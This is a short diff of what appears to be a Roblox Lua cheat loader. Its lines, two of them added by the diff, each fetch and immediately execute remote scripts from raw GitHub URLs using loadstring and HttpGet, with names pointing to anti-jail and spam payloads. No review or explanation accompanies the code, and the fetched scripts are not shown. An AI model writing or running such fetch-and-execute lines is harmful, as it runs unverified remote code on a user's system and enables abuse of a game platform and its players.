@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ily123950/Antijail/main/Hi"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ily123950/D/main/Hx"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ily123950/laos/main/Latros"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ily123950/spam/main/sc"))()
 wait(2)
